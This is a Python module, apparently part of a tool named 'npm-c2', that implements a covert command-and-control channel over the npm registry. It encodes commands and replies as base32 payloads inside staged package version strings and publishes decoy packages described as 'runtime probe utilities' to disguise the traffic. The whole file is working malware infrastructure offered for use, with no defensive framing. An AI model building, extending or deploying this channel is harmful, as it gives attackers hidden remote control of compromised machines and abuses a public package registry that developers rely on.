"""Staging transport for npm-c2.

Why this exists: npm retired classic tokens and removed direct-publish from
bypass-2FA granular tokens. Measured against registry.npmjs.org:

    PUT  /-/package/<pkg>/dist-tags/<tag>   -> 403 (automation token)
    POST /-/stage/package/<pkg>             -> 201 (works)

Staging is the one write path npm still allows automation, and it is the path
npm tells people to move to for 2027. So the channel rides on staged versions.

Capacity
--------
The registry exposes only the version string back to a reader; `description`
is normalised away and the tarball requires a second authenticated GET per
message. So the version itself carries the payload.

Measured limits: a version string may be up to ~250 chars, and semver allows
only [0-9A-Za-z.-] in the prerelease, with one extra rule: an all-numeric
identifier may not have a leading zero.

Wire format
-----------
    <base>-<channel>.<seq>.<kind>.<payload>

    base     0.0.0, fixed, so every message looks like a build prerelease
    channel  4 chars a-f        (letters only: can never look all-numeric)
    seq      h + 6 hex          ("h" makes it alphanumeric, so leading
                                 zeros are legal and the field stays fixed)
    kind     c command | r reply
    payload  base32 A-Z2-7      (no 0/1 ever, so no leading-zero hazard,
                                 and 5 bits per char)

That leaves ~230 payload chars = ~143 bytes per message, before compression.

Fields are dot-separated semver identifiers, not a single blob, so the reader
can address messages without parsing the payload.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import io
import json
import re
import tarfile
import time

VERSION_BASE = "0.0.0"
CHANNEL_LEN = 4
SEQ_LEN = 6
MAX_VERSION = 250            # measured: 238 ok, 259 rejected
KIND_CMD = "c"
KIND_REPLY = "r"

_V_RE = re.compile(
    r"^" + re.escape(VERSION_BASE) +
    r"-([a-f][0-9a-f]{%d})\.h([0-9a-f]{%d})\.([cr])\.([A-Z2-7]+)$"
    % (CHANNEL_LEN - 1, SEQ_LEN))
CHANNEL_RE = re.compile(r"^[a-f][0-9a-f]{%d}$" % (CHANNEL_LEN - 1))

# base32 without 0/1, so a payload can never be an all-numeric identifier with
# a leading zero -- the one semver rule that would bite us.
_B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"


def b32encode(raw: bytes) -> str:
    """Base32 with a semver-safe alphabet, no padding."""
    bits = "".join(f"{b:08b}" for b in raw)
    bits += "0" * (-len(bits) % 5)
    return "".join(_B32[int(bits[i:i + 5], 2)]
                   for i in range(0, len(bits), 5))


def b32decode(text: str) -> bytes:
    """Reverse b32encode."""
    bits = "".join(f"{_B32.index(c):05b}" for c in text)
    return bytes(int(bits[i:i + 8], 2)
                 for i in range(0, len(bits) - len(bits) % 8, 8))


def payload_room() -> int:
    """Characters available for the payload inside one version string."""
    fixed = (len(VERSION_BASE) + 1      # "0.0.0-"
             + CHANNEL_LEN + 1          # channel + "."
             + 1 + SEQ_LEN + 1          # "h" seq + "."
             + 1 + 1)                   # kind + "."
    return MAX_VERSION - fixed


def make_version(channel: str, seq: int, kind: str, payload: str) -> str:
    """Assemble one message into a version string."""
    if not CHANNEL_RE.match(channel):
        raise ValueError(
            f"channel must be {CHANNEL_LEN} chars, start a-f, rest 0-9a-f: "
            f"{channel!r}")
    if kind not in (KIND_CMD, KIND_REPLY):
        raise ValueError(f"kind must be c or r: {kind!r}")
    if len(payload) > payload_room():
        raise ValueError(
            f"payload {len(payload)} > room {payload_room()}")
    return (f"{VERSION_BASE}-{channel}."
            f"h{seq % (16 ** SEQ_LEN):0{SEQ_LEN}x}.{kind}.{payload}")


def parse_version(version: str):
    """Return a dict for one of our messages, or None if it is not ours."""
    m = _V_RE.match(version)
    if not m:
        return None
    return {"channel": m.group(1), "seq": int(m.group(2), 16),
            "kind": m.group(3), "payload": m.group(4)}


def encode_message(channel: str, seq: int, kind: str, data: bytes) -> list:
    """Split data across as many staged versions as it needs.

    Each version's payload is `<T><I><body>` where T is the part count and I
    the part index, both single base32 digits (so a message can span up to 32
    parts). Keeping the header exactly two chars means the reader can strip a
    fixed prefix instead of guessing where the body starts.
    """
    body = b32encode(gzip.compress(data, 9)) if len(data) > 32 else b32encode(data)
    room = payload_room() - 2          # 2 chars for <total><index>
    parts = [body[i:i + room] for i in range(0, len(body), room)] or [""]
    if len(parts) > len(_B32):
        raise ValueError(
            f"{len(parts)} parts exceeds the {len(_B32)} this header can address")
    out = []
    for i, part in enumerate(parts, start=1):
        head = _B32[len(parts) - 1] + _B32[i - 1]
        out.append(make_version(channel, seq + i, kind, head + part))
    return out


def decode_message(parts) -> bytes:
    """Reassemble one message from its versions, in sequence order."""
    if not parts:
        return b""
    ordered = sorted(parts, key=lambda p: p["seq"])
    body = "".join(p["payload"][2:] for p in ordered)
    raw = b32decode(body)
    if raw[:2] == b"\x1f\x8b":
        return gzip.decompress(raw)
    return raw


# ---------------------------------------------------------------- publishing
def _tarball(name: str, version: str) -> bytes:
    """Minimal valid npm tarball: package.json + index.js, gzipped."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        def add(path, data):
            info = tarfile.TarInfo(path)
            info.size = len(data)
            info.mtime = int(time.time())
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))

        pkg = {"name": name, "version": version, "main": "index.js",
               "license": "MIT", "description": "runtime probe utilities"}
        add("package/package.json", json.dumps(pkg).encode())
        add("package/index.js", b"module.exports = {};\n")
    gz = io.BytesIO()
    with gzip.GzipFile(fileobj=gz, mode="wb", mtime=0) as f:
        f.write(buf.getvalue())
    return gz.getvalue()


def build_body(name: str, version: str) -> dict:
    """The packument + attachment a staged publish expects.

    Reconstructed from libnpmpublish: POST /-/stage/package/<escaped name>.
    """
    tb = _tarball(name, version)
    shasum = hashlib.sha1(tb).hexdigest()
    integrity = "sha512-" + base64.b64encode(
        hashlib.sha512(tb).digest()).decode()
    fname = f"{name}-{version}.tgz"
    manifest = {
        "name": name,
        "version": version,
        "main": "index.js",
        "license": "MIT",
        "description": "runtime probe utilities",
        "_id": f"{name}@{version}",
        "dist": {
            "shasum": shasum,
            "integrity": integrity,
            "tarball": f"https://registry.npmjs.org/{name}/-/{fname}",
        },
    }
    return {
        "_id": name,
        "name": name,
        "description": "runtime probe utilities",
        "dist-tags": {"latest": version},
        "versions": {version: manifest},
        "_attachments": {
            fname: {
                "content_type": "application/octet-stream",
                "data": base64.b64encode(tb).decode(),
                "length": len(tb),
            }
        },
    }
